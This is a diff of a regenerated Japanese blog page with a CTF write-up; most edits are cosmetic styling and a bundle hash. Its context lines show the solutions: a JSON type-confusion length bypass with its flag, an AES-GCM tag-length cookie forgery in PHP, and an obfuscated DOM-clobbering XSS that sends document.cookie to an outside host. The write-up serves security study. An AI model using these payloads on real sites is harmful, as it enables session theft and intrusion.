@@ -58,7 +58,7 @@ Upside-down cake 1000文字以下の回文を入力できれば勝ち、だがre
     <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
 
     
-    <script src="/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js" integrity="sha256-cCk0mKqWstu3Z&#43;wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script>
+    <script src="/js/bundle.min.7136b4abac7b277aba8bc933917f4602d39a5c44f5590be687244bc86ef4f162.js" integrity="sha256-cTa0q6x7J3q6i8kzkX9GAtOaXET1WQvmhyRLyG708WI="></script>
 
     
 
@@ -201,13 +201,13 @@ Upside-down cake 1000文字以下の回文を入力できれば勝ち、だがre
 <h2 id="upside-down-cake">Upside-down cake</h2>
 <p>1000文字以下の回文を入力できれば勝ち、だがrequest body sizeの制限がかかっており1000文字送りつけることはできない。</p>
 <p><code>string.length &lt; 1000</code> などのチェックを以下のJSONで回避する。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;palindrome&#34;</span>:{<span style="color:#f92672">&#34;length&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#f92672">&#34;0&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#f92672">&#34;NaN&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span>}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;palindrome&#34;</span>:{<span style="color:#f92672">&#34;length&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#f92672">&#34;0&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#f92672">&#34;NaN&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span>}}
 </span></span></code></pre></div><p>FLAG: <code>TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}</code></p>
 <h2 id="dance">#DANCE</h2>
 <p>tagの長さが検証されていない。
 以下の記事を見ながらadminのCookieを作る。</p>
 <p><a href="https://www.mbsd.jp/research/20200901/aes-gcm/">https://www.mbsd.jp/research/20200901/aes-gcm/</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>$admin <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>;
 </span></span><span style="display:flex;"><span>$guest <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;guest&#39;</span>;
 </span></span><span style="display:flex;"><span>$xors <span style="color:#f92672">=</span> [];
@@ -255,17 +255,17 @@ Upside-down cake 1000文字以下の回文を入力できれば勝ち、だがre
 <li>必要な各種文字列を <code>&lt;a&gt;</code> のnameに設定し、 <code>r['name']</code> のようにして読み取る</li>
 <li><code>window.location</code> のかわりに <code>[IFRAME Element].location</code> を代入する。</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">rrrrr</span>[
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">rrrrr</span>[
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">r</span>[
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">rrrr</span> <span style="color:#f92672">=</span>
 </span></span><span style="display:flex;"><span>  [<span style="color:#a6e22e">r</span> <span style="color:#f92672">+</span> [<span style="color:#a6e22e">rr</span> <span style="color:#f92672">=</span> [] <span style="color:#f92672">==</span> []]][<span style="color:#a6e22e">rr</span> <span style="color:#f92672">=</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">rr</span>][<span style="color:#a6e22e">rr</span>] <span style="color:#f92672">+</span> <span style="color:#75715e">// n
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [<span style="color:#a6e22e">r</span> <span style="color:#f92672">+</span> []][<span style="color:#a6e22e">rrr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rr</span>][<span style="color:#f92672">++</span><span style="color:#a6e22e">rrr</span>] <span style="color:#f92672">+</span> <span style="color:#75715e">// a
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [<span style="color:#a6e22e">r</span> <span style="color:#f92672">+</span> []][<span style="color:#a6e22e">rr</span>][<span style="color:#a6e22e">rrr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rrr</span>] <span style="color:#f92672">+</span> <span style="color:#75715e">// m
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [<span style="color:#a6e22e">r</span> <span style="color:#f92672">+</span> []][<span style="color:#a6e22e">rr</span>][<span style="color:#a6e22e">rrr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rrr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rrr</span>] <span style="color:#75715e">//e
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ] <span style="color:#75715e">// &#39;location&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>] <span style="color:#f92672">=</span>
+</span></span></span><span style="display:flex;"><span>  [<span style="color:#a6e22e">r</span> <span style="color:#f92672">+</span> []][<span style="color:#a6e22e">rrr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rr</span>][<span style="color:#f92672">++</span><span style="color:#a6e22e">rrr</span>] <span style="color:#f92672">+</span> <span style="color:#75715e">// a
+</span></span></span><span style="display:flex;"><span>  [<span style="color:#a6e22e">r</span> <span style="color:#f92672">+</span> []][<span style="color:#a6e22e">rr</span>][<span style="color:#a6e22e">rrr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rrr</span>] <span style="color:#f92672">+</span> <span style="color:#75715e">// m
+</span></span></span><span style="display:flex;"><span>  [<span style="color:#a6e22e">r</span> <span style="color:#f92672">+</span> []][<span style="color:#a6e22e">rr</span>][<span style="color:#a6e22e">rrr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rrr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rrr</span>] <span style="color:#75715e">//e
+</span></span></span><span style="display:flex;"><span>  ] <span style="color:#75715e">// &#39;location&#39;
+</span></span></span><span style="display:flex;"><span>] <span style="color:#f92672">=</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">rrrrrr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rrrrr</span>[<span style="color:#a6e22e">rrrrrr</span>[<span style="color:#a6e22e">rrrr</span>]][<span style="color:#a6e22e">rrrrrrr</span>[<span style="color:#a6e22e">rrrr</span>]] <span style="color:#75715e">// document.cookie
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">location</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">r</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;name://&#39;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">location</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">r</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;name://&#39;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">document</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">rrrrrr</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://mocos.kitchen:12345/&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">cookie</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">rrrrrrr</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
 </span></span><span style="display:flex;"><span>
@@ -277,7 +277,7 @@ Upside-down cake 1000文字以下の回文を入力できれば勝ち、だがre
 <p>CSP nonceで制限されているXSS問。
 レスポンスに含まれている <code>![xxx](...)</code> が <code>&lt;img srcset=&quot;...&quot; alt=&quot;xxx&quot;&gt;</code> に変換されるフィルターが存在する。
 アップロードしたファイルを閲覧する画面で、script内に <code>![...](...)</code> を埋め込むことでエラーを出さないようにパズルをしながら関数を実行する。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{csp_nonce()}}&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{csp_nonce()}}&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>            const files = {{files|json|safe}};
 </span></span></code></pre></div><p>その他、パズルに必要な要素がいっぱい出てくるがざっと列挙してみるとこんな感じ。</p>
 <ul>
@@ -309,7 +309,7 @@ Content-Type: image/png
         <p>
             <a href="/post/2023/2023-09-03-midnightsun/">
                 &#8592;
-                Previous:
+                :
                 Midnight Sun CTF 2023 Finals - Obelix
             </a>
         </p>
@@ -323,7 +323,7 @@ Content-Type: image/png
     <div class="next-post">
         <p>
             <a href="/post/2023/2023-12-28-hotel-2023/">
-                Next:
+                :
                 2023年宿泊した宿
                 &#8594;
             </a>
